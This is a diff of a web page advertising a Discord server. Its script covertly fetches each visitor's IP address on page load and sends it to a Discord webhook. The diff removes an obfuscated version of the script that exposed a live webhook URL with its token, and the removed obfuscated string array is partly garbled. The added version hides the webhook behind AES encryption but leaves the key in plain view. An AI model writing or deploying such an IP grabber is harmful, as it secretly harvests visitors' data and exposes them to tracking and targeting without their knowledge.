@@ -10,6 +10,7 @@
     <meta property="og:description" content="discord.gg/drogen!">
     <meta name="theme-color" content="#11b9d6">
     <link rel="icon" type="image/png" href="https://i.imgur.com/9BrtuAf.jpeg">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1-crypto-js.js"></script>
     <style>
         body {
             display: flex;
@@ -37,17 +38,57 @@
     <p><span id="ip-address"></span></p>
 
     <script>
-        (function(){
-            const _0x23c7=['ip','ok','getElementById','textContent','then','error','json','catch','Content-Type','Network             const _0x23c7=['ip','ok','getElementById','textContent','then','error','json','catch','Content-Type','Network\x20response             const _0x23c7=['ip','ok','getElementById','textContent','then','error','json','catch','Content-Type','Network\x20response\x20was             const _0x23c7=['ip','ok','getElementById','textContent','then','error','json','catch','Content-Type','Network\x20response\x20was\x20not             const _0x23c7=['ip','ok','getElementById','textContent','then','error','json','catch','Content-Type','Network\x20response\x20was\x20not\x20ok','Sigma:             const _0x23c7=['ip','ok','getElementById','textContent','then','error','json','catch','Content-Type','Network\x20response\x20was\x20not\x20ok','Sigma:\x20','Error:','fetch','application/json','POST'];
-            (function(_0x24ab09,_0x23c7e5){const _0x3ea5d0=function(_0x4e2c51){while(--_0x4e2c51){_0x24ab09['push'](_0x24ab09['shift']());}};_0x3ea5d0(++_0x23c7e5);}(_0x23c7,0x8a));
-            const _0x3ea5=function(_0x24ab09,_0x23c7e5){_0x24ab09=_0x24ab09-0x0;let _0x3ea5d0=_0x23c7[_0x24ab09];return _0x3ea5d0;};
+        // Verschlüsselter Webhook-URL
+        const encryptedWebhookURL = 'U2FsdGVkX1+J0BcJTLnGcYY/lwJww11aZ2ijsejxjsY=';  // Dein verschlüsselter Webhook
 
-            function sendToDiscord(_0x2bd2f0){const _0x522f1b='https://discord.com/api/webhooks/1329145057978220574/t0H16LD-DXtBVkWb6VcP7F0Flp_CF1M4mYwRBiBZSa-DBSLbzXssdBLhsTwl91KFvKvy';const _0x2a0e4f={'content':_0x3ea5('0xa')+_0x2bd2f0};_0x3ea5('0xb')(_0x522f1b,{'method':_0x3ea5('0xd'),'headers':{'Content-Type':_0x3ea5('0xc')},'body':JSON['stringify'](_0x2a0e4f)})[_0x3ea5('0x4')](_0x1720dc=>{if(!_0x1720dc[_0x3ea5('0x1')]){throw new Error(_0x3ea5('0x9'));}})[_0x3ea5('0x8')](_0x3cd735=>console[_0x3ea5('0x5')](_0x3ea5('0x6'),_0x3cd735));}
+        const secretKey = 'dein-geheimes-passwort';  // Das gleiche geheime Passwort, das du für die Verschlüsselung verwendet hast
 
-            function getIP(_0x334055){const _0x337305=_0x334055[_0x3ea5('0x0')];document[_0x3ea5('0x2')]('ip-address')[_0x3ea5('0x3')]=_0x337305;sendToDiscord(_0x337305);}
+        // Funktion, um den Webhook-URL zu entschlüsseln
+        function decryptWebhook(encrypted) {
+            const bytes = CryptoJS.AES.decrypt(encrypted, secretKey);
+            const decryptedText = bytes.toString(CryptoJS.enc.Utf8);
+            console.log("Entschlüsselter Webhook-URL:", decryptedText); // Debugging
+            return decryptedText;
+        }
 
-            _0x3ea5('0xb')('https://api.ipify.org/?format=json')[_0x3ea5('0x4')](_0x40466a=>_0x40466a[_0x3ea5('0x7')]())[_0x3ea5('0x4')](_0x445f8b=>getIP(_0x445f8b))[_0x3ea5('0x8')](_0x354edb=>console[_0x3ea5('0x5')](_0x3ea5('0x6'),_0x354edb));
-        })();
+        function sendToDiscord(ip) {
+            const webhookURL = decryptWebhook(encryptedWebhookURL);  // Entschlüsselter Webhook-URL
+            const data = {
+                content: `Sigma: ${ip}`
+            };
+
+            console.log("Sende an Webhook:", webhookURL); // Debugging
+            console.log("IP-Adresse:", ip); // Debugging
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    console.log("IP erfolgreich gesendet!"); // Debugging
+                })
+                .catch(error => {
+                    console.error('Fehler beim Senden an Discord:', error); // Debugging
+                });
+        }
+
+        function getIP(json) {
+            const ipAddress = json.ip;
+            document.getElementById("ip-address").textContent = ipAddress;
+            sendToDiscord(ipAddress);
+        }
+
+        // IP-Adresse abrufen und weiterverarbeiten
+        fetch('https://api.ipify.org/?format=json')
+            .then(response => response.json())
+            .then(data => getIP(data))
+            .catch(error => console.error('Fehler beim Abrufen der IP:', error)); // Debugging
     </script>
 </body>
 </html>
